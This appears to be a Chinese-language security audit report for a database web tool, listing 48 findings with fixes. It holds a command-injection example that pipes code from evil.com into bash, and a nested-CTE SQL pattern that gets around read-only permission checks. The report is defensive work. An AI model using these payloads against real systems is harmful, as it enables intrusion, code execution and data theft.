# Zeta 项目全面代码审查报告

> 审查日期：2026-10-17
> 项目版本：v1.0.0
> 技术栈：Cloudflare Workers + Hono v4 + D1 + KV / React 19 + Vite 8
> 审查范围：安全、正确性、代码质量、前端、CI/部署、测试覆盖

---

## 汇总

| 级别 | 数量 |
|------|------|
| **Critical** | 2 |
| **High** | 6 |
| **Medium** | 18 |
| **Low** | 14 |
| **Info** | 8 |
| **合计** | **48** |

### 按类别分布

| 类别 | Critical | High | Medium | Low | Info |
|------|----------|------|--------|-----|------|
| 安全 — 认证/会话 | 0 | 1 | 3 | 2 | 1 |
| 安全 — SQL 执行与权限 | 1 | 1 | 1 | 0 | 0 |
| 安全 — 管理接口 | 0 | 1 | 1 | 0 | 0 |
| 安全 — Setup 端点 | 1 | 1 | 1 | 0 | 0 |
| 安全 — 中间件/头部 | 0 | 0 | 1 | 3 | 0 |
| 安全 — 密钥/加密 | 0 | 1 | 1 | 1 | 0 |
| 安全 — CI/CD | 0 | 1 | 3 | 0 | 1 |
| 正确性 — 竞态与逻辑 | 0 | 0 | 3 | 1 | 0 |
| 正确性 — 错误处理 | 0 | 0 | 1 | 2 | 0 |
| 代码质量 — 类型安全 | 0 | 0 | 1 | 1 | 1 |
| 前端 — i18n | 0 | 0 | 1 | 2 | 1 |
| 前端 — 其它 | 0 | 0 | 0 | 1 | 1 |
| 数据库 Schema | 0 | 0 | 1 | 1 | 1 |
| 测试 | 0 | 0 | 0 | 0 | 2 |

---

## 发现详情

发现按严重级别从高到低排列。

---

### Critical

#### C-1: SQL 权限分类可被 CTE 嵌套绕过 — 只读用户可执行写操作

- **文件**: `worker/src/routes/query.ts` 第 101–116 行
- **描述**: `normalizeForClassification()` 用于判断 SQL 是读操作还是写操作，它会依次剥离 CTE（`WITH ... AS (...)`），但硬编码了 `MAX_CTES = 20` 的上限。如果用户构造超过 20 层嵌套 CTE 的 SQL 语句，函数将返回未完全解析的文本，导致 `isWriteSql()` 返回 false。只读权限（`read`）的用户因此可以通过类似以下方式绕过权限检查：
  ```sql
  WITH c1 AS (SELECT 1), c2 AS (SELECT 1), ..., c21 AS (SELECT 1)
  DELETE FROM some_table
  ```
  虽然 `d1.prepare(sql).all()` 在 D1 中对写操作也可能生效（取决于 D1 行为），但权限检查被完全绕过。
- **触发场景**: 拥有任何数据库 `read` 权限的普通用户，在 SQL 编辑器中输入 21 个以上的 CTE 前缀加写操作 SQL。
- **修复建议**: 改为白名单方式：判断剥离 CTE 后的语句是否以 `SELECT`/`EXPLAIN`/`PRAGMA`（只读）开头，否则视为写操作。或者去掉 `MAX_CTES` 上限并使用递归解析。同时，对 `isDestructiveSql` 实施同样的修复。

#### C-2: 初始化端点使用 GET 方法执行写操作，Secret 暴露风险高

- **文件**: `worker/src/routes/setup.ts` 第 130 行
- **描述**: `setup.get('/:secret', ...)` — 该端点在数据库中创建所有表并写入默认配置，但使用了 GET 方法。GET 请求的 URL（包含 secret）会出现在：
  - 浏览器历史记录
  - HTTP 服务器/代理日志
  - `Referer` 请求头（如果页面中有外链）
  - 搜索引擎爬虫和聊天软件的链接预览
  - CDN/代理缓存
- **触发场景**: 管理员在浏览器中访问 `/api/setup/my-secret`，该 URL 被记录在各处，后续任何能看到日志/历史的人都可以重放。
- **修复建议**: 改为 POST 方法，将 secret 放到请求体中。

---

### High

#### H-1: 管理员可通过 `binding_name` 探测 Worker 环境变量

- **文件**: `worker/src/routes/admin.ts` 第 209–211 行
- **描述**: 注册数据库时 `c.env[body.binding_name]` 直接以用户提供的 `binding_name` 访问 `env` 对象的任意属性。虽然 `typeof .prepare !== 'function'` 检查阻止了非 D1 对象的使用，但错误信息 `Binding "${body.binding_name}" not found on this Worker` 可以作为 oracle，让攻击者确认特定属性是否存在于 `env` 上。更严重的是，如果注册 `binding_name: "DB"`，则查询会直接在管理数据库上执行，可以读取用户密码哈希、TOTP 密钥、审计日志等所有管理数据。
- **触发场景**: 已登录的管理员账户（或被 XSS/凭据泄露控制的管理员会话）通过 POST `/api/admin/databases` 注册 `binding_name: "DB"`，然后通过 SQL 查询读取 `users` 表。
- **修复建议**:
  1. 对 `binding_name` 实施白名单/前缀验证（如必须以 `QUERY_DB_` 开头）
  2. 将错误消息统一为 "Invalid binding"，不暴露具体名称
  3. 排除已知的管理绑定（`DB`、`KV`、`ASSETS`）

#### H-2: 数据库设置表中明文存储 API 密钥和密码

- **文件**: `worker/src/routes/setup.ts` 第 113–126 行, `worker/src/routes/admin.ts` 第 356–378 行
- **描述**: `resend_config`（含 `api_key`）和 `smtp_config`（含 `password`）以明文 JSON 存储在 D1 的 `settings` 表中。如果 D1 数据被导出、备份泄露，或者通过 H-1 所述的绑定名漏洞访问管理数据库，这些凭据会直接暴露。
- **触发场景**: 
  1. 任何能直接访问 D1 数据库的人（CF Dashboard、D1 导出等）都可以看到明文密码
  2. 与 H-1 组合：管理员注册 `DB` 绑定后执行 `SELECT * FROM settings`
- **修复建议**: 使用与 TOTP 同样的 AES-GCM 加密机制对敏感配置值进行加密存储。或者将邮件凭据改为 Worker Secrets。

#### H-3: SQL 禁止模式列表不完整

- **文件**: `worker/src/routes/query.ts` 第 12–16 行
- **描述**: `FORBIDDEN_PATTERNS` 仅禁止了 `PRAGMA...=`（赋值型）、`ATTACH DATABASE`、`DETACH DATABASE`。缺少：
  - `PRAGMA` 只读型（如 `PRAGMA table_info(...)`）可泄露 schema 信息
  - `VACUUM`、`REINDEX` 可能导致长时间阻塞 (DoS)
  - 如果目标 D1 实际上是管理数据库（见 H-1），这些信息泄露更严重
- **触发场景**: 任何有查询权限的用户发送 `PRAGMA table_list` 获取完整表结构。
- **修复建议**: 将所有 `PRAGMA` 列入禁止模式（不仅是赋值型），同时禁止 `VACUUM`/`REINDEX`。考虑使用白名单模式代替黑名单。

#### H-4: 登录响应泄露内部用户 ID

- **文件**: `worker/src/routes/auth.ts` 第 181 行
- **描述**: `return c.json({ requires2fa: true, pendingToken, userId: user.id })` — 当 2FA 被要求时，响应中包含了内部 UUID 格式的 `userId`。这个 ID 已编码在 `pendingToken` 的 JWT payload 中，在响应中暴露是多余的。攻击者通过已知的邮箱/密码组合可以收集所有用户的内部 ID。
- **触发场景**: 攻击者使用已知凭据登录开启了 2FA 的账号，从响应中获取 `userId`。
- **修复建议**: 从响应中移除 `userId` 字段。前端 `TwoFactorModal` 只使用 `pendingToken`，不需要 `userId`。

#### H-5: deploy.yml 中 sed 命令存在注入风险

- **文件**: `.github/workflows/deploy.yml` 第 66–69 行
- **描述**: `sed -i "s/.../${CLOUDFLARE_ACCOUNT_ID}/"` 等命令直接将 GitHub Variables 插值到 `sed` 替换表达式中。如果任何变量值包含 `/`、`&`、`\` 等 `sed` 特殊字符，命令会出错或产生非预期行为。虽然这些值来自仓库管理员设置（非外部输入），但模式本身不安全。
- **触发场景**: 管理员在 GitHub Variables 中设置了包含特殊字符的值（如 D1 数据库名包含 `/`）。
- **修复建议**: 使用 `|` 作为 `sed` 分隔符，或改用 `envsubst`/Node.js 脚本进行模板替换。

#### H-6: tag.yml 中存在潜在脚本注入

- **文件**: `.github/workflows/tag.yml` 第 18、35、52 行
- **描述**: `${{ inputs.tag }}` 直接插值到 shell `run:` 块中。虽然第一步的 semver 正则验证（第 19 行）在当前流程中能有效阻止注入，但后续步骤（第 35、52 行）重复使用了相同的不安全模式。如果未来重构时验证步骤被移动或移除，这些位置会成为命令注入漏洞。
- **触发场景**: 当前已被 semver 校验缓解。但如果校验被绕过或移除，恶意输入如 `v1.0.0"; curl evil.com | bash; echo "` 可执行任意命令。
- **修复建议**: 将 `${{ inputs.tag }}` 赋值给环境变量（`env:`），然后在 `run:` 中通过 `$TAG` 引用。

---

### Medium

#### M-1: 速率限制存在 TOCTOU 竞态条件

- **文件**: `worker/src/lib/auth.ts` 第 188–226 行
- **描述**: 所有速率限制函数（`checkLoginRateLimit`、`check2faRateLimit`、`checkEmailRateLimit`、`checkRegisterRateLimit`）执行读取-判断-写入的非原子操作。在并发请求下，多个请求可能同时读到相同计数，各自写入 `count + 1`，导致实际允许的尝试次数超出限制。KV 的最终一致性模型会放大这个窗口。
- **触发场景**: 攻击者从同一 IP 并发发送大量登录请求，部分请求可以绕过 10 次的限制。
- **修复建议**: 考虑使用 Durable Objects 或 D1 的原子操作替代 KV 进行速率限制。或者接受 KV 的局限性并在文档中说明这是近似限制。

#### M-2: Access Token 不检查会话失效状态

- **文件**: `worker/src/middleware/auth.ts` 第 5–13 行
- **描述**: `requireAuth` 中间件验证 JWT 签名和过期时间，但不检查 KV 中的 `sessionInvalidatedAt`。密码修改或管理员操作设置 `sessionInvalidatedAt` 后，已签发的 Access Token（最长 15 分钟）仍然有效。失效检查仅在 Refresh Token 轮换时（`routes/auth.ts` 第 312–315 行）执行。
- **触发场景**: 用户修改密码后，攻击者持有的 Access Token 在最长 15 分钟内仍可使用。
- **修复建议**: 这是无状态 JWT 的常见权衡。如果需要即时撤销，可以在 `requireAuth` 中增加 KV 查询，但会增加每次请求的延迟。建议至少在关键操作（如删除用户、修改权限）时检查 `sessionInvalidatedAt`。或者缩短 Access Token TTL（如 5 分钟）。

#### M-3: ENCRYPTION_KEY 缺少格式校验

- **文件**: `worker/src/lib/totp.ts` 第 6–8 行
- **描述**: `getDerivedKey` 将 `env.ENCRYPTION_KEY` 通过 `hexToBuf` 转换后导入为 AES-GCM 密钥，但未验证其长度是否为 64 个十六进制字符（32 字节）。空字符串、奇数长度、非十六进制字符等都会产生长度不正确的密钥。
- **触发场景**: 部署时 `ENCRYPTION_KEY` 配置错误（如设为短字符串），TOTP 密钥将使用弱加密。
- **修复建议**: 在 `getDerivedKey` 中添加验证：`if (env.ENCRYPTION_KEY.length !== 64 || !/^[0-9a-fA-F]+$/.test(env.ENCRYPTION_KEY)) throw new Error(...)`。

#### M-4: 管理员测试邮件端点无速率限制

- **文件**: `worker/src/routes/admin.ts` 第 392–408 行
- **描述**: `POST /api/admin/settings/test-email` 可向任意邮箱发送测试邮件，但无速率限制。被控制的管理员账号可用此功能作为邮件中继发送垃圾邮件。
- **触发场景**: 管理员凭据泄露后，攻击者利用此端点向任意收件人批量发送邮件。
- **修复建议**: 添加速率限制，如每 IP 每 15 分钟最多 3 次。

#### M-5: 2FA 凭据删除无需重新认证

- **文件**: `worker/src/routes/profile.ts` 第 125–131 行（TOTP）、第 198–203 行（Passkey）
- **描述**: 删除 TOTP 或 Passkey 凭据只需有效的 Access Token，无需输入密码或进行其他验证。如果 Access Token 被窃取（如 XSS），攻击者可以在 15 分钟内静默移除目标用户的所有 2FA 凭据。
- **触发场景**: 攻击者获取用户 Access Token → 调用 `DELETE /api/profile/totp/:id` 和 `DELETE /api/profile/passkey/:id` 移除所有 2FA → 用户下次登录不再需要 2FA。
- **修复建议**: 删除 2FA 凭据时要求输入当前密码。

#### M-6: Notebook 的 database_id 未校验用户权限

- **文件**: `worker/src/routes/notebooks.ts` 第 43 行、第 94–97 行
- **描述**: 创建或更新 Notebook 时，`database_id` 字段直接接受客户端值，未验证用户是否有权访问该数据库。虽然这不会直接授予查询权限，但可以关联到用户无权访问的数据库。
- **触发场景**: 普通用户将 Notebook 关联到无权限的数据库 ID。
- **修复建议**: 验证 `database_id` 对应的数据库存在且用户有访问权限。

#### M-7: CORS 对空 Origin 的处理

- **文件**: `worker/src/index.ts` 第 18–22 行
- **描述**: 当 `origin` 为空（如 `data:` URL、`blob:` URL、沙盒 iframe、服务端直接调用）时，`if (!origin || !allowed) return allowed ?? null` 将 CORS 头设置为 `APP_URL`，实际上允许了无 origin 的请求。结合 `credentials: true`（第 23 行），这意味着来自 `data:` 或 `blob:` URL 的请求可以携带 Cookie 访问 API。
- **触发场景**: 攻击者在受害者浏览器中打开 `data:text/html,...` 页面发起带 Cookie 的 API 请求。（待确认：现代浏览器对 `data:` URL 的 credential 处理可能已阻止此类攻击）
- **修复建议**: 当 `origin` 为空/null 时返回 `null`，拒绝 CORS。

#### M-8: Refresh Cookie 的 Secure 标志依赖 APP_URL 配置

- **文件**: `worker/src/routes/auth.ts` 第 42 行
- **描述**: `isSecure = (env: Env) => env.APP_URL?.startsWith('https')` — 如果生产环境在 TLS 终止代理后面但 `APP_URL` 被错误配置为 `http://`，所有 Refresh Token Cookie 将不带 `Secure` 标志，在 HTTP 传输中可能被窃取。
- **触发场景**: 管理员将 `APP_URL` 设为 `http://...` 但实际服务运行在 HTTPS 代理后。
- **修复建议**: 补充使用 `X-Forwarded-Proto` 或 `CF-Visitor` 头来判断是否安全连接，或在文档中强调 `APP_URL` 必须配置为 HTTPS。

#### M-9: Setup 端点的 Secret 比对存在长度泄露

- **文件**: `worker/src/routes/setup.ts` 第 138–141 行
- **描述**: `let diff = secret.length ^ expected.length` 在循环比较之前就泄露了预期 secret 的长度信息。虽然循环本身使用了 `|| 0` 处理短字符串，实现了对字节的恒定时间比较，但攻击者可以通过二分法迅速确定 secret 的确切长度。
- **触发场景**: 攻击者发送不同长度的 secret，通过时间差确定目标长度后再逐字节猜测。（实际因网络延迟影响，时间侧信道在远程场景下较难利用，但理论上存在。标注为待确认）
- **修复建议**: 使用 `crypto.subtle.timingSafeEqual`（如果可用）或先将两个值哈希后再比较。

#### M-10: 首个注册用户成为管理员的竞态条件

- **文件**: `worker/src/routes/auth.ts` 第 73–75 行
- **描述**: `SELECT CASE WHEN COUNT(*) = 0 THEN 'admin' ELSE 'member' END FROM ${T.users}` 在 INSERT 语句的子查询中判断是否为首个用户。如果两个注册请求几乎同时到达，理论上两者都可能在 `COUNT(*)` 返回 0 时插入，导致两个管理员账户。
- **触发场景**: 全新部署后，两个用户几乎同时注册。
- **修复建议**: D1 的单写入者模型在实践中大幅降低了此问题的概率，但建议在表上添加唯一约束或使用 `INSERT ... SELECT` 加锁。（待确认：D1 当前是否保证单写入者串行化）

#### M-11: deploy.yml 缺少 permissions 声明

- **文件**: `.github/workflows/deploy.yml`
- **描述**: 部署作业没有声明 `permissions` 块，将使用仓库默认权限（可能是 `write-all`）。此作业只需要 `contents: read` 权限。
- **触发场景**: 如果 Cloudflare API Token 泄露或依赖供应链被攻击，过高的 GitHub 令牌权限会扩大攻击面。
- **修复建议**: 添加 `permissions: contents: read`。

#### M-12: CI/CD Actions 未固定到 Commit SHA

- **文件**: `.github/workflows/ci.yml`、`deploy.yml`、`release.yml`、`tag.yml`
- **描述**: 所有 Actions（`actions/checkout@v7`、`pnpm/action-setup@v6` 等）均使用主版本标签而非 commit SHA 固定。如果上游 Action 被劫持（tag 被覆盖指向恶意 commit），CI/CD 环境会被入侵。
- **触发场景**: 上游 Action 仓库被入侵并修改了 tag 指向的 commit。
- **修复建议**: 将所有第三方 Actions 固定到 commit SHA，如 `actions/checkout@<sha>`，并添加版本注释。

#### M-13: Renovate 自动合并范围过广

- **文件**: `.github/renovate.json` 第 10–11 行
- **描述**: `"matchUpdateTypes": ["patch", "minor"], "automerge": true` 应用于所有依赖的 patch/minor 更新。一个被入侵的包发布恶意 minor 版本后会被自动合并。
- **触发场景**: 某个依赖包发布包含恶意代码的 minor 版本。
- **修复建议**: 限制自动合并到已知可信的包组，或要求至少一个审批者。确保分支保护规则要求 CI 通过。

#### M-14: SMTP `from` 地址未经验证

- **文件**: `worker/src/lib/email.ts` 第 97–98 行, 第 178 行
- **描述**: `from` 地址来自数据库配置（`config.from`）或 `EmailPayload.from`，但没有通过 `isValidEmail()` 验证。如果管理员在 SMTP 配置中设置了包含 `\r\n` 的 `from` 地址，可能导致 SMTP 命令注入。`fromName` 虽然移除了 `\r\n`（第 98 行），但 `from` 本身没有此处理。
- **触发场景**: 管理员在设置中输入格式异常的 from 地址。
- **修复建议**: 对 `from` 地址也执行 `isValidEmail()` 验证。

#### M-15: 邮件 OTP 发送端点不消耗 pending token

- **文件**: `worker/src/routes/auth.ts` 第 236–258 行
- **描述**: `POST /api/auth/2fa/email-otp/send` 检查 `jtiDeny` 但不将 JTI 加入拒绝列表。这意味着同一个 `pendingToken` 可以无限次触发 OTP 发送（在 10 分钟有效期内）。虽然每次发送会覆盖 KV 中存储的 OTP，但会消耗邮件发送配额。
- **触发场景**: 攻击者获得 `pendingToken` 后反复调用发送接口消耗邮件配额。
- **修复建议**: 为 OTP 发送添加独立的速率限制（如每 `pendingToken` 最多发送 3 次）。

#### M-16: query_history 表缺少 ON DELETE 子句和时间索引

- **文件**: `worker/migrations/0001_init.sql` 第 62–71 行, `worker/src/routes/setup.ts` 第 66–77 行
- **描述**: 
  1. `query_history` 的 `user_id` 和 `database_id` 外键没有 `ON DELETE` 子句，删除用户或数据库时会留下孤立记录（admin.ts 第 178 行手动处理了删除，但如果遗漏会导致外键约束错误）
  2. `executed_at` 列没有索引，但查询历史始终按此排序（query.ts 第 334、344 行），数据增长后性能会下降
- **触发场景**: 查询历史表增长到数千行后，按时间排序的查询变慢。
- **修复建议**: 
  1. 添加 `ON DELETE CASCADE` 或 `ON DELETE SET NULL`
  2. 添加 `CREATE INDEX idx_query_history_executed ON query_history(executed_at)`

#### M-17: 默认配置安全性偏弱

- **文件**: `worker/src/routes/setup.ts` 第 113–126 行
- **描述**: 默认配置中 `registration_enabled = true`、`require_email_verification = false`、`enforce_2fa = false`。对于数据库管理工具，这意味着新部署后任何人都可以注册账号并立即访问（无需邮件验证和 2FA）。
- **触发场景**: 管理员部署 Zeta 后忘记修改默认配置。
- **修复建议**: 考虑将 `require_email_verification` 和 `enforce_2fa` 的默认值改为 `true`，或在初始化后引导管理员完成安全配置。

#### M-18: 前端存在大量未翻译的硬编码字符串

- **文件**: 多个前端文件
- **描述**: 以下组件/页面中存在硬编码的英文字符串，未使用 `t()` 国际化函数：
  - `ResultsPanel.tsx` 第 21、49、72、81、83 行 — `"results"`, `"error"`, `"Error"`, `"row"/"rows"`, `"change"/"changes"`（**最显著的 i18n 缺口**）
  - `Login.tsx` 第 34 行 — `'Login failed'`
  - `Register.tsx` 第 24 行 — `'Registration failed'`
  - `Query.tsx` 第 127、136、275 行 — `'Query failed'`, `'Theme: ${theme}'`
  - `Profile.tsx` 第 58、70、84、97、121、135 行 — 多个 `'Failed...'` 字符串
  - `TwoFactorModal.tsx` 第 31、50、68、70 行 — 多个错误提示
  - `ForgotPassword.tsx` 第 20 行 — `'An error occurred'`
  - `ResetPassword.tsx` 第 27 行 — `'Reset failed'`
  - `VerifyEmail.tsx` 第 15、18 行 — `'No token provided.'`, `'Verification failed'`
  - `ResultTable.tsx` 第 7 行 — `"No rows returned"`
  - `Users.tsx` 第 59、97 行 — `'Failed to delete user'`, `'An error occurred'`
  - `Databases.tsx` 第 57 行 — `'Failed'`
  - `AdminSettings.tsx` 第 95 行 — `'Failed to save'`
  - `App.tsx` 第 18 行 — `"Loading..."`（在 `AuthProvider` 外，无法使用 `useLocale`）
- **触发场景**: 中文用户在上述场景中看到英文错误提示或状态文字。
- **修复建议**: 将所有字符串提取到 `translations.ts`，对 `App.tsx` 的 `RouteLoading` 可以使用 `getStoredLocale()` 直接读取翻译。

---

### Low

#### L-1: PBKDF2 迭代次数低于当前 OWASP 建议

- **文件**: `worker/src/lib/auth.ts` 第 6 行
- **描述**: `PBKDF2_ITERATIONS = 100_000`。OWASP 2023 指南建议 PBKDF2-SHA256 使用至少 600,000 次迭代。100,000 在实践中仍算安全，但低于最新推荐。Cloudflare Workers 的 CPU 限制可能是降低迭代次数的原因。
- **触发场景**: 数据库泄露后，攻击者利用 GPU 离线暴力破解密码哈希。
- **修复建议**: 在 Workers CPU 限制允许的前提下尽量提高迭代次数。如果 100,000 是 Workers 可承受的上限，在文档中说明理由。

#### L-2: JWT 缺少 `iss`/`aud` 声明

- **文件**: `worker/src/lib/auth.ts` 第 130–133 行
- **描述**: JWT 不包含 `iss`（发行者）或 `aud`（受众）声明。如果 `JWT_SECRET` 意外在多个服务间共享，一个服务签发的令牌可以被另一个服务接受。
- **触发场景**: 开发者在测试/生产环境间共享了 `JWT_SECRET`。
- **修复建议**: 添加 `iss` 和 `aud` 声明并在验证时检查。

#### L-3: CSP 允许 `unsafe-inline` 样式

- **文件**: `worker/src/middleware/security.ts` 第 11 行
- **描述**: `style-src 'self' 'unsafe-inline'` 允许内联样式，可用于 CSS 注入攻击（如 CSS 数据泄露）。同时缺少 `base-uri` 和 `form-action` 指令。
- **触发场景**: 如果存在 HTML 注入点，攻击者可注入 `<style>` 标签泄露页面数据。
- **修复建议**: 使用 nonce 或 hash 替代 `unsafe-inline`。添加 `base-uri 'none'; form-action 'self'`。

#### L-4: CSP 阻止 Google Fonts 加载

- **文件**: `worker/src/middleware/security.ts` 第 11 行, `web/index.html` 第 20–22 行
- **描述**: CSP 规则 `style-src 'self' 'unsafe-inline'` 不包含 `fonts.googleapis.com`，而 `font-src` 也未包含 `fonts.gstatic.com`。`index.html` 引用的 Google Fonts 样式表和字体文件会被 CSP 阻止加载。（待确认：Workers Assets 是否在不同阶段应用 CSP。如果安全头仅对 `/api/*` 生效——第 28 行 `app.use('/api/*', securityHeaders)` 确认了这一点——则字体加载不受影响）
- **触发场景**: 如果将来安全头应用范围扩大到所有路由，字体将被阻止。
- **修复建议**: 当前无影响（安全头仅对 API 路由生效），但如果扩展到全局，需更新 CSP 或改为自托管字体。也可考虑自托管字体以避免向 Google 泄露用户 IP（GDPR 合规）。

#### L-5: 邮件 HTML 模板 `escapeHtml` 不转义单引号

- **文件**: `worker/src/lib/email.ts` 第 260 行
- **描述**: `escapeHtml` 函数转义了 `&`、`<`、`>`、`"` 但遗漏了 `'`。如果邮件 HTML 模板中使用了单引号属性，可能存在 XSS 风险。当前模板使用双引号，暂无实际影响。
- **触发场景**: 未来在邮件模板中使用 `'` 包围属性值。
- **修复建议**: 添加 `'` → `&#39;` 转义。

#### L-6: OTP 生成存在微弱模数偏差

- **文件**: `worker/src/routes/auth.ts` 第 251 行
- **描述**: `crypto.getRandomValues(new Uint32Array(1))[0]! % 900000 + 100000` — 因为 `2^32 % 900000 ≠ 0`，6 位数 OTP 的分布存在极其微弱的不均匀（偏差约 0.02%），不影响安全性但技术上不完美。
- **触发场景**: 无实际安全影响。
- **修复建议**: 可忽略。如需修复，使用拒绝采样法。

#### L-7: 前端错误处理存在静默吞噬

- **文件**: `web/src/pages/Query.tsx` 第 83 行, `web/src/components/QueryHistoryPanel.tsx` 第 29 行, `web/src/pages/admin/Databases.tsx` 第 87–98 行
- **描述**: 多处 API 调用的 `.catch(() => {})` 静默吞噬错误，用户无法得到反馈：
  - 数据库列表加载失败（Query.tsx:83）
  - 查询历史加载失败（QueryHistoryPanel.tsx:29）
  - 权限授予/撤销失败（Databases.tsx:87-98）
  - 角色修改错误（Users.tsx:46-48）
- **触发场景**: API 请求因网络问题失败，用户看到空列表但无错误提示。
- **修复建议**: 添加错误状态显示或使用 Toast 通知用户。

#### L-8: ForgotPassword 页面成功与错误状态无法区分

- **文件**: `web/src/pages/ForgotPassword.tsx` 第 19–20 行
- **描述**: 成功和错误消息共用同一个 `message` state 变量，且视觉样式相同（`text-zinc-300`）。用户无法从界面上判断操作是否成功。
- **触发场景**: 用户提交忘记密码表单，看到一条消息但不确定是成功还是失败。
- **修复建议**: 使用独立的 `success`/`error` state，分别使用绿色/红色样式。

#### L-9: 前端不安全类型转换

- **文件**: 多处
- **描述**: 多处使用了 `as` 类型断言进行不安全的转换：
  - `web/src/pages/admin/Databases.tsx` 第 41、83 行 — `res.results as DbRecord[]`
  - `web/src/components/QueryHistoryPanel.tsx` 第 28 行 — `res.results as HistoryItem[]`
  - `web/src/pages/Query.tsx` 第 118 行 — `as Record<string, unknown>[]`
  - `web/src/pages/admin/AdminSettings.tsx` 第 53、60 行 — `as any`
- **触发场景**: 如果 API 返回结构与预期不符，运行时不会报错但会产生未定义行为。
- **修复建议**: 使用 Zod 等库进行运行时校验，或在 `apiFetch` 泛型中添加运行时检查。

#### L-10: 绑定名泄露给非管理员用户

- **文件**: `worker/src/routes/query.ts` 第 178 行
- **描述**: `error: \`Binding "${db.binding_name}" not found. Contact the admin.\`` — 当绑定不存在时，错误消息中包含内部绑定名称，任何有查询权限的用户都能看到。
- **触发场景**: 数据库配置的绑定名在 wrangler.toml 中不存在时，查询用户可看到绑定名。
- **修复建议**: 将错误消息统一为 "Database configuration error. Contact the admin."，不暴露绑定名。

#### L-11: Notebook 删除的 "最后一个" 检查存在竞态

- **文件**: `worker/src/routes/notebooks.ts` 第 126–131 行
- **描述**: 先检查 notebook 数量是否 > 1，再执行删除。两个并发删除请求都可能通过数量检查，导致最后的 notebook 也被删除。
- **触发场景**: 用户在两个浏览器标签页中快速删除最后两个 notebook。
- **修复建议**: 使用条件删除 `DELETE ... WHERE (SELECT COUNT(*) ...) > 1` 或事务。

#### L-12: HSTS 头不在 HTTP 环境中设置

- **文件**: `worker/src/middleware/security.ts` 第 12–14 行
- **描述**: HSTS 仅在 `APP_URL` 以 `https` 开头时才设置。如果配置错误，浏览器不会将站点标记为 HSTS，首次 HTTP 访问存在中间人风险。
- **触发场景**: `APP_URL` 配置为 `http://` 但实际通过 HTTPS 服务。
- **修复建议**: 在 Cloudflare Workers 环境中，通常所有流量都通过 HTTPS。可以考虑始终设置 HSTS。

#### L-13: 前端 AdminRoute 仅进行客户端角色检查

- **文件**: `web/src/App.tsx` 第 29–36 行
- **描述**: `AdminRoute` 仅在客户端检查 `user.role !== 'admin'`。如果攻击者修改内存中的 `currentUser` 对象将 `role` 设为 `admin`，可以看到管理界面的 UI。后端正确地使用了 `requireAdmin` 中间件，所以 API 调用会被拒绝。
- **触发场景**: 攻击者通过浏览器控制台修改 user 对象 → 可以看到管理界面框架但无法执行操作。
- **修复建议**: 这是 SPA 的标准实践（前端只做 UX 守卫）。后端已有正确的权限检查，无需额外修复。标注为已知设计。

#### L-14: SMTP/Resend 密码保留逻辑可被绕过

- **文件**: `worker/src/routes/admin.ts` 第 356–378 行
- **描述**: 设置更新时通过 `if (!newConfig.password)` / `if (!newConfig.api_key)` 判断是否保留旧密码。问题是：空字符串 `""` 也是 falsy，所以提交 `{ password: "" }` 会保留旧密码而非清空。提交 `{ password: "••••••" }`（前端的脱敏占位符）会将占位符字面量作为密码存储。
- **触发场景**: 管理员想要清空 SMTP 密码却无法操作；或不小心保存了脱敏占位符。
- **修复建议**: 将判断改为检查占位符值 `"••••••"`：`if (newConfig.password === '••••••' || newConfig.password === undefined)`。

---

### Info

#### I-1: 无请求体大小限制

- **文件**: `worker/src/index.ts`
- **描述**: 所有路由都没有对请求体大小进行限制。恶意客户端可以发送超大 JSON 载荷耗尽 Worker 的 CPU 时间或内存。Cloudflare Workers 默认有请求大小限制（免费版 100MB），但处理大 JSON 仍会消耗 CPU。
- **修复建议**: 使用 Hono 的 `bodyLimit` 中间件为各路由设置合理的大小上限。

#### I-2: 健康检查端点可用于指纹识别

- **文件**: `worker/src/index.ts` 第 42 行
- **描述**: `GET /api/health` 返回 `{ ok: true }`，无需认证。安全扫描器可用此确认服务为 Zeta。
- **修复建议**: 无需修改。如有顾虑可返回空 200 响应。

#### I-3: Tailwind 配置文件可能未生效

- **文件**: `web/tailwind.config.js`
- **描述**: 项目使用 Tailwind v4（通过 `@tailwindcss/vite` 插件），而 `tailwind.config.js` 是 v3 格式的配置文件。Tailwind v4 使用 CSS `@theme` 指令进行配置，此 JS 文件可能被完全忽略。`content`（第 3 行）和 `darkMode`（第 4 行）设置可能不生效。
- **修复建议**: 验证该文件是否被 Tailwind v4 读取。如果不需要则移除，避免混淆。

#### I-4: compatibility_date 已过时

- **文件**: `worker/wrangler.toml` 第 3 行
- **描述**: `compatibility_date = "2025-04-01"` 已过期一年多。较旧的兼容日期意味着无法使用 Workers 运行时的新安全修复和功能。
- **修复建议**: 定期更新兼容日期。

#### I-5: @types/qrcode 放在 dependencies 而非 devDependencies

- **文件**: `web/package.json` 第 18 行
- **描述**: `"@types/qrcode": "^1.5.6"` 在 `dependencies` 中。类型包应放在 `devDependencies`。
- **修复建议**: 移至 `devDependencies`。

#### I-6: PAT_TOKEN 作用域不明

- **文件**: `.github/workflows/tag.yml` 第 31 行
- **描述**: `token: ${{ secrets.PAT_TOKEN }}` — 此 Personal Access Token 的权限范围不明。如果拥有过广的权限，被泄露后影响范围会超出本仓库。
- **修复建议**: 确认 PAT_TOKEN 仅拥有对本仓库 `contents: write` 的权限。

#### I-7: About 页面硬编码版本号

- **文件**: `web/src/pages/About.tsx` 第 42 行
- **描述**: 版本号 `v1.0.0` 硬编码在代码中，发布新版本时容易遗忘更新。
- **修复建议**: 从 `package.json` 或构建环境变量中读取版本号。

#### I-8: deploy.yml 中缺少 D1 迁移步骤

- **文件**: `.github/workflows/deploy.yml`
- **描述**: 部署流程中没有执行 D1 数据库迁移的步骤。如果新版本代码依赖新的数据库 schema，部署后可能出错。当前依赖 `/api/setup/:secret` 端点进行初始化，但后续 schema 变更没有自动化流程。
- **修复建议**: 在 deploy 步骤中添加 `wrangler d1 migrations apply` 或类似命令。

---

## 测试覆盖情况

| 区域 | 覆盖情况 | 评价 |
|------|----------|------|
| **前端 SQL 解析** (`web/src/lib/__tests__/sql.test.ts`) | ✅ 11 个测试用例 | 覆盖了基本语句分割、注释处理、引号转义等场景 |
| **前端组件/页面** | ❌ 无测试 | 无 React 组件测试 |
| **后端路由** | ❌ 无测试 | 无 API 端点测试 |
| **后端库函数** | ❌ 无测试 | `auth.ts`、`totp.ts`、`email.ts` 等核心安全函数无单元测试 |
| **SQL 分类器** (`isWriteSql`、`isForbiddenSql`) | ❌ 无测试 | **安全关键函数无测试** — 这是发现 C-1 的原因之一 |
| **CI 流程** | ✅ lint + build + type-check + web test | 基本 CI 完整 |
| **E2E 测试** | ❌ 无 | 无端到端测试 |

**测试建议**（按优先级排序）：
